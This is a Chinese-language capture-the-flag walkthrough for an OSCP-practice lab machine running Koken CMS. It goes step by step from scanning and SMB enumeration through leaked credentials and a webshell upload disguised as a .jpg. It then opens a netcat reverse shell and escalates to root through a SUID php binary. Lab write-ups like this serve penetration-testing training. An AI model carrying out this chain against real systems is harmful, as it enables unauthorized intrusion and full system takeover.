虚拟机简介：该机器是为准备OSCP而开发的,两个flag：user.txt和proof.txt

目标：2个flag

级别：中级

1、通过arp-scan检测主机IP地址

arp-scan -l

2、通过nmap进行端口扫描

nmap -A -sS -sV -v -p- 192.168.1.10
查看开放80、139、445、8000端口

3、WEB渗透测试

3.1 根据开放的端口，先探测smb服务连接

enum4linux 192.168.1.10
查看到共享文件为：sambashare

使用smbclient进行连接，密码为空，发现两个文件下载到本地

smbclient -H //192.168.1.10/sambashareget mailsent.txtget wordpress.bkp.zip

3.2 查看下载mailsent.txt文件发现有两个账号：agi和Daisa，密码有可能是babygirl

3.3 查看wp-config-sample.php，得到密码为：senha_aqui

3.4 通过访问80端口没有得到有用信息，访问8000端口时候显示为Koken CMS

使用searchsploit查找获取到有漏洞利用方式

searchsploit koken

查看漏洞利用方法，需要认证成功

3.5 根据站点信息，用户名登录为邮箱，账号为：daisa@photographer.com，密码为：babygirl

3.6 根据说明先配置好webshell，并把webshell修改为以jpg格式的后缀

mv shell.php shell.php.jpg

开启burpsuite截断，并点击上传webshell

3.7 上传完毕后会显示webshell的访问地址，需要在kali中启动NC监听

nc -nlvp 4444

访问webshell地址，获取反弹shell

http://192.168.1.10:8000/storage/originals/41/e1/shell.php

3.8 使用python优化脚本，查看home目录下的daisa文件获得第一个flag

python -c "import pty;pty.spawn('/bin/bash')"cat /home/daisa/user.txt

4、系统提权

4.1 查找具有SUID的二进制

find / -perm -u=s -type f 2>/dev/null

4.2 使用php进行提权

/usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"

4.3 查看flag

ls /rootcat /root/proof.txt
